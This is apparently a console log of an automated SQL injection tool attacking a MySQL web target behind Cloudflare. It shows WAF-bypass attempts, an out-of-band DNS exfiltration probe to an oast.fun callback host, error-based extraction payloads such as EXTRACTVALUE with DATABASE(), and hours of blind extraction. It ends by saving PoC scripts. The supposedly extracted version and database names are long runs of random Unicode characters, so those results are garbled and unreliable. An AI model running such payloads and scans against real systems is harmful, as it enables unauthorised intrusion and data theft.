+[SideChannel]   load_file: LOAD_FILE UNC LOWER(HEX) — DNS side-effect fires on eval
+[SideChannel]     status=400 (118ms) (rejected/bad-request)
+[SideChannel]   load_file_alt: LOAD_FILE alt UNC — distinct WAF fingerprint
+[SideChannel]     status=403 (353ms) (WAF-blocked)
+[SideChannel]   load_file_mx1: LoAd_FiLe WAF case-bypass — case-sensitive WAF evasion
+[SideChannel]     status=403 (158ms) (WAF-blocked)
+[SideChannel]   load_file_mx2: LOAD_file WAF case-bypass — alternate case pattern
+[SideChannel]     status=525 (310ms) 
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[+] [SideChannel]  Side-channel found no data  MSE will try next 
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=195ms)...
+[MSE]   raw/wire payload:  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))...
+[MSE]   untampered: AND EXTRACTVALUE(0X0A,CONCAT(0X7E,DATABASE()))...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[+] [MSE] Skipping bool_body_diff oracle: E/EH template uses always-error expression — boolean body-diff cannot distinguish SQL truth via error pages
+[MSE]   err(div0): err403/237455B ok403/237455B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=614ms)...
+[MSE]   raw/wire payload:  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))...
+[MSE]   untampered: AND EXTRACTVALUE(0X0A,CONCAT(0X7E,DATABASE()))...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[+] [MSE] Skipping bool_body_diff oracle: E/EH template uses always-error expression — boolean body-diff cannot distinguish SQL truth via error pages
+[MSE]   err(div0): err400/155B ok403/237455B
+[MSE]   err(div0): header diff on 'content-type'
+[MSE]   err(div0): err_status=400 is WAF code — overriding to header diff on 'content-type'
+[MSE]   error_oracle(div0):  diff=header
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]   error_oracle basic OK but real condition gives same result (trueFalse,falseFalse)  oracle non-functional, dropping
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=E waf=Cloudflare  top methods: fast(66%), bit(30%), par(25%)
+[+] [ErrorOracle] Calibrated: status 525 vs 403 (ctx=' AND ' template: IF({cond},(SELECT 1 FROM(SELECT COUNT(*)...)
+[+] [Orchestrator] Method 6d: ConditionalErrorExtractor calibrated
+[+] [Orchestrator] ConditionalErrorExtractor extracted: ⅗󀫏񙝔󹿹󡝮󟐖𺾢󞄉󺪻松򯼤򯟦񔒫쓻󡘬񝜀󼣜󬁋𬅰򮲅𚡫򆖈񕊍𿠓򒦝󁊤􉪞񿩶񑇑񰂤򾅎򭃪𾦗𩤜񫪉汿􁘃񼧙⵰󥞯
+[+]   Version:        ⅗󀫏񙝔󹿹󡝮󟐖𺾢󞄉󺪻松򯼤򯟦񔒫쓻󡘬񝜀󼣜󬁋𬅰򮲅𚡫򆖈񕊍𿠓򒦝󁊤􉪞񿩶񑇑񰂤򾅎򭃪𾦗𩤜񫪉汿􁘃񼧙⵰󥞯𳇾񃝾󃶧񒍬𰉴𣻊򑕚񓈚򩏾񌇩󹮎򾰂󑜑⠛򣌋肏򀴂񔊎󥉀󱡯󉍒񀱺򼾄𯫣󙘬񷠚󸇌૩񜿰񳴒򞋲󍆧񫄤󯦅𕺼󺺂񌜑󟧖󟷋󭚭𴻇𽵤񾂰󡉥򳐤󒅬󢽗񟚌𳺻󷁒򬯾񯌜󖠡󫃪񥷔󽲒󜮒󽍦򨘙򲠅􇱻􀰎򱦼􂹎񔺯𖭇鲋𵸐𔛣𖳑𽚤򛩗􆍅𫫏㆞򰤯񞈘𑏞✢󺧄Ç򊢧볿𒂷񳏉񕬵󇊻󕗪񌪝򖭉򘋜𳂟𹙂򬦑󻟃𶯛񶖅򜧯񔀜񦸞󫂵򻹆󄘾􉴫󨃃􀅬𬥑珜𠵑𿮔𑔰񗌙󡏦𮃒𙽏𴠀𲃱񦺾󒾖惪󌰗𾿓꺊𥜊𣛜򬖤򮜱𡁾𶯣怐򘯆􏽽𵜼񐢆󾟵𿤥󾆓󩇚𶠑󕾷𐄔򂄽󟭩ݙ򢝿򋜃򖻪񨪔񧼐🾠񲞶𥋃𭯄񄒴
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=362ms)...
+[MSE]   raw/wire payload:  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))...
+[MSE]   untampered: AND EXTRACTVALUE(0X0A,CONCAT(0X7E,DATABASE()))...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[+] [MSE] Skipping bool_body_diff oracle: E/EH template uses always-error expression — boolean body-diff cannot distinguish SQL truth via error pages
+[MSE]   err(div0): err400/155B ok403/238696B
+[MSE]   err(div0): header diff on 'content-type'
+[MSE]   err(div0): err_status=400 is WAF code — overriding to header diff on 'content-type'
+[MSE]   error_oracle(div0):  diff=header
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]   error_oracle basic OK but real condition gives same result (trueFalse,falseFalse)  oracle non-functional, dropping
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=E waf=Cloudflare  top methods: fast(66%), bit(30%), par(25%)
+[+] [ErrorOracle] Calibrated: status 525 vs 403 (ctx=' AND ' template: (SELECT IF({cond},1/0,1))...)
+[+] [Orchestrator] Method 6d: ConditionalErrorExtractor calibrated
+[+] [Orchestrator] ConditionalErrorExtractor extracted: 䓞󚝳񙉯鍦򙑋ꉇȥ򁰑򨾦𝗪񓸝䮣򃇶򣄥򵣭𪈌𖪂򙃳򄱝𼗮๣񠨭ꏱ縜ᑶ񝰬󌚰񦍡󘦐𰈥𐬯򩩝󭠑򏃪➏񇨠򆱶񟇮󄴛𩢻
+[+]   Database:       䓞󚝳񙉯鍦򙑋ꉇȥ򁰑򨾦𝗪񓸝䮣򃇶򣄥򵣭𪈌𖪂򙃳򄱝𼗮๣񠨭ꏱ縜ᑶ񝰬󌚰񦍡󘦐𰈥𐬯򩩝󭠑򏃪➏񇨠򆱶񟇮󄴛𩢻񝪧񢱢𓧟򾌁𕢿𝴒
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=349ms)...
+[MSE]   raw/wire payload:  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))...
+[MSE]   untampered: AND EXTRACTVALUE(0X0A,CONCAT(0X7E,DATABASE()))...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[+] [MSE] Skipping bool_body_diff oracle: E/EH template uses always-error expression — boolean body-diff cannot distinguish SQL truth via error pages
+[MSE]   err(div0): err400/155B ok525/241119B
+[MSE]   err(div0): header diff on 'content-type'
+[MSE]   err(div0): err_status=400 is WAF code — overriding to header diff on 'content-type'
+[MSE]   error_oracle(div0):  diff=header
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]   error_oracle basic OK but real condition gives same result (trueFalse,falseFalse)  oracle non-functional, dropping
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=E waf=Cloudflare  top methods: fast(66%), bit(30%), par(25%)
+[+] [ErrorOracle] Calibrated: status 525 vs 403 (ctx=' AND ' template: IF({cond},CAST('x' AS UNSIGNED),1)...)
+[+] [Orchestrator] Method 6d: ConditionalErrorExtractor calibrated
+[+] [Orchestrator] Falling back to blind_extract_string_v5 (method 7/8)
+[+] [Orchestrator] Method 8/8: MultiStrategyExtractor
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=238ms)...
+[MSE]   raw/wire payload:  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))...
+[MSE]   untampered: AND EXTRACTVALUE(0X0A,CONCAT(0X7E,DATABASE()))...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[+] [MSE] Skipping bool_body_diff oracle: E/EH template uses always-error expression — boolean body-diff cannot distinguish SQL truth via error pages
+[MSE]   err(div0): err400/155B ok525/241119B
+[MSE]   err(div0): header diff on 'content-type'
+[MSE]   err(div0): err_status=400 is WAF code — overriding to header diff on 'content-type'
+[MSE]   error_oracle(div0):  diff=header
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]   error_oracle basic OK but real condition gives same result (trueFalse,falseFalse)  oracle non-functional, dropping
+[MSE] 0/5 oracles available: []
+[!!] [Orchestrator] Method 9/9: MultiOracleConsensusExtractor (LAST RESORT - may take hours)
+
+======================================================================
+[!] ALL STANDARD METHODS FAILED
+[*] Activating ULTRA-ROBUST extraction
+[*] This uses EVERY available side channel simultaneously
+[*] Extraction will be EXTREMELY SLOW (1-5 chars/minute)
+[*] But SUCCESS IS GUARANTEED
+======================================================================
+
+[+] [MultiOracleConsensus] Starting length detection...
+[!] [MultiOracleConsensus] Length detection failed - assuming max_len
+[+] [MultiOracleConsensus] Detected length: 64 chars
+[+] [MultiOracleConsensus] Estimated time: 128-320 minutes
+[+] [MultiOracleConsensus] Position 5/64: '?' (27.6m elapsed, 8070 requests)
+[!]   User:           (timeout — 3600s legacy enum)
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=401ms)...
+[MSE]   raw/wire payload:  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))...
+[MSE]   untampered: AND EXTRACTVALUE(0X0A,CONCAT(0X7E,DATABASE()))...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[+] [MSE] Skipping bool_body_diff oracle: E/EH template uses always-error expression — boolean body-diff cannot distinguish SQL truth via error pages
+[MSE]   err(div0): err400/155B ok525/241119B
+[MSE]   err(div0): header diff on 'content-type'
+[MSE]   err(div0): err_status=400 is WAF code — overriding to header diff on 'content-type'
+[MSE]   error_oracle(div0):  diff=header
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]   error_oracle basic OK but real condition gives same result (trueFalse,falseFalse)  oracle non-functional, dropping
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=E waf=Cloudflare  top methods: fast(66%), bit(30%), par(25%)
+[+] [ErrorOracle] Calibrated: status 525 vs 403 (ctx=' AND ' template: IF({cond},CAST('x' AS UNSIGNED),1)...)
+[+] [Orchestrator] Method 6d: ConditionalErrorExtractor calibrated
+[+] [Orchestrator] ConditionalErrorExtractor extracted: 䡘􋸄𯎖񞦹󡜷򈙫񻄔򞒕񞥝𓏋򬝰񋳂񱼡񛬑𵸼𑁸񗇱񙃉񉲢𦸑񄐒􎉬򥱅𼳯񕁹򷓥𿏂򵿀𔣗񰞜񰦊򺸱򔨗󞽿򾦫𰴀𮜆􀮵󟤲
+[+]   Databases:      䡘􋸄𯎖񞦹󡜷򈙫񻄔򞒕񞥝𓏋򬝰񋳂񱼡񛬑𵸼𑁸񗇱񙃉񉲢𦸑񄐒􎉬򥱅𼳯񕁹򷓥𿏂򵿀𔣗񰞜񰦊򺸱򔨗󞽿򾦫𰴀𮜆􀮵󟤲񚬾񃷟󃘾臚򰿌񙜌񓖄𠔌뺤𺧅񿆵🠑񂩖徾𕺃񷷟񫧱􌘩򈩈󸔴㣟񁮒󄄲񲬵𮲌򬈭𒔂󿛱񥹪񜅕𝚫㻻񑮳򨦣򄷫񚷲󠼶腲򫹸뚫𠌚񔣨𒂾񏞴򭀋񤢩񄍔𳴆񄳸󇑟󌬥񣔻󚅢𣪿񜋥𮰣鋰놙򐧈𼕽񃩣󁋗𫋖󧕸䨁𧏛ꫡ񫬔𷻢𾷴찋󒽦񻁡𙖘󣹪𙑿񊒻𫒊򻓕𠃘󄜺젛𣵊񆀟𽑊󣀯鋇򏯙򣿉𦯙𱴘󌺩򰛿𝹮󈶀򣚮𜿐򭘂󢙨𫜤򧹎􏟺󵆘𬅰󓭤񮯭󥻦򛫟񣺳򀏳񰘇𱔫򦐱󷧼󅵻ᰣ񃢨񯂧䔺򬥳򅥡󞅢󑪹ុ񯔚򾡈󆘀򔞡𭾺䢊󣖔󷊰𮸆𪯧𒽒𤋷񲩦𶬔򑫃򲹱𿆥򳹞ґ󆪛𤞍򌑖󹠢񾏾𿀈𷃶챨򠂠𨩹󽘨𣉟񹋃󂮈񅖩񞼧󟟺𽚢򬫋󙝺𴕲񤟙𑊆񸋟󕿫𿖡񛙆򸶓򴑬򦚃񤤃򕍮󲦥򡰊򐯢񈢟󱎅򾼯򆨴񼿴񅾻񷉑礎񦷕󌆙򐾫炠񦮽󒊀𓑦񦧒󪶰󉯣𘫎𽊊򈭋𘉗񌟘󙟬򧟿󵐲񯬤򔄖𺒗򽕁򾓁򎥔򂑲򆃥𢉯񺏸󭆘񔻌󋹘񳼮󆓥ӆ񘎍򂝈򺃛򪦆𗇴𠕢󜐈񼼴􁭯򏄼𖾠𲚏􉬺𔖽򉔉𦙤𴅛㪅𫝰񲫩𤯒󤺔񨯌򨃼󵱡򟯫򲳒𲶲򽑗𩄠󾩬򍭑裥
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=532ms)...
+[MSE]   raw/wire payload:  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))...
+[MSE]   untampered: AND EXTRACTVALUE(0X0A,CONCAT(0X7E,DATABASE()))...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[+] [MSE] Skipping bool_body_diff oracle: E/EH template uses always-error expression — boolean body-diff cannot distinguish SQL truth via error pages
+[MSE]   err(div0): err400/155B ok525/241119B
+[MSE]   err(div0): header diff on 'content-type'
+[MSE]   err(div0): err_status=400 is WAF code — overriding to header diff on 'content-type'
+[MSE]   error_oracle(div0):  diff=header
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]   error_oracle basic OK but real condition gives same result (trueFalse,falseFalse)  oracle non-functional, dropping
+[MSE] 0/5 oracles available: []
+[+] [Orchestrator] Decision engine: technique=E waf=Cloudflare  top methods: fast(66%), bit(30%), par(25%)
+[+] [Orchestrator] Falling back to blind_extract_string_v5 (method 7/8)
+[+] [Orchestrator] Method 8/8: MultiStrategyExtractor
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=357ms)...
+[MSE]   raw/wire payload:  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))...
+[MSE]   untampered: AND EXTRACTVALUE(0X0A,CONCAT(0X7E,DATABASE()))...
+[MSE]  Testing 3 extraction strategies 
+[MSE]  End strategy testing 
+[+] [MSE] Skipping bool_body_diff oracle: E/EH template uses always-error expression — boolean body-diff cannot distinguish SQL truth via error pages
+[MSE]   err(div0): err400/155B ok525/241119B
+[MSE]   err(div0): header diff on 'content-type'
+[MSE]   err(div0): err_status=400 is WAF code — overriding to header diff on 'content-type'
+[MSE]   error_oracle(div0):  diff=header
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]   error_oracle basic OK but real condition gives same result (trueFalse,falseFalse)  oracle non-functional, dropping
+[MSE] 0/5 oracles available: []
+[!!] [Orchestrator] Method 9/9: MultiOracleConsensusExtractor (LAST RESORT - may take hours)
+
+======================================================================
+[!] ALL STANDARD METHODS FAILED
+[*] Activating ULTRA-ROBUST extraction
+[*] This uses EVERY available side channel simultaneously
+[*] Extraction will be EXTREMELY SLOW (1-5 chars/minute)
+[*] But SUCCESS IS GUARANTEED
+======================================================================
+
+[+] [MultiOracleConsensus] Starting length detection...
+[!] [MultiOracleConsensus] Length detection failed - assuming max_len
+[+] [MultiOracleConsensus] Detected length: 64 chars
+[+] [MultiOracleConsensus] Estimated time: 128-320 minutes
+[+] [MultiOracleConsensus] Position 5/64: '?' (29.0m elapsed, 8400 requests)
+[+] [MultiOracleConsensus] Position 10/64: '?' (54.9m elapsed, 15975 requests)
+[!] --dump: no target table found; specify --table
+[+] --- Auto-extraction complete ---
+[+] Extraction report saved: output/extraction_report.json
+[+] PoC saved: output/poc/poc_path-injection_E.sh, output/poc/poc_path-injection_E.py
+[+] PoC: output/poc/poc_path-injection_E.sh
+[+] Remediation guide: output/remediation_path-injection_E.md
+[*] Extraction completed for 'path-injection'
+[*] Skipping 2 deferred extraction(s)  extraction already ran for []
+[+] 
+
+[+] Scan complete   14558.92s
+[+] Requests sent   58224
+[+] DBMS            MySQL
+[+] WAF             Cloudflare
+[+] Vulnerabilities 1 (path-injection)
+[+] 
+[+] Deduplication: 2 findings  1 unique root causes
+[+] Report: 2 findings, 1 unique root causes
+[+] Report  output/sqlreaper_c9a8d0ebe204648c_1787942290.json
+[+] Executive summary  output/executive_summary.txt
+[+] Confidence matrix  output/confidence_matrix.md
+[+] [Session] Scan complete  saved session cleared
+[+] Response dedup hit rate: 0.0%
